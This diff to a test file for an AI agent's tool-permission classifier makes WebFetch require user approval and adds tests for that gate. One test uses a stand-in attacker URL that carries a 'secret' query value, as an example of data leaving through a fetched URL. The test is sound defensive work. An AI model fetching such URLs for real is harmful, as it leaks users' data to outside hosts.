@@ -112,8 +112,9 @@ describe("classifyTool", () => {
       "Grep",
       "Write",
       "WebSearch",
-      "WebFetch",
       "ToolSearch",
+      "TodoWrite",
+      "StructuredOutput",
       "Task",
       "create_artifact",
       "share_with_meeting",
@@ -186,5 +187,19 @@ describe("describeTool", () => {
 
   it("guarantees MCP prefix stripping is case-insensitive", () => {
     expect(describeTool("mcp__COMPOSIO__GITHUB_CREATE_ISSUE")).toBe("Github: create issue");
+  });
+});
+
+describe("WebFetch gate", () => {
+  it("asks before WebFetch because a URL can carry data out", () => {
+    const decision = classifyTool("WebFetch", { url: "https://attacker.example/?q=secret" });
+    expect(decision).toMatchObject({ kind: "ask" });
+    expect(decision.kind === "ask" && decision.reason).toContain("attacker.example");
+  });
+
+  it("lets a per-employee override re-allow WebFetch", () => {
+    expect(classifyTool("WebFetch", { url: "https://example.com" }, { WebFetch: "allow" })).toEqual({
+      kind: "allow",
+    });
   });
 });
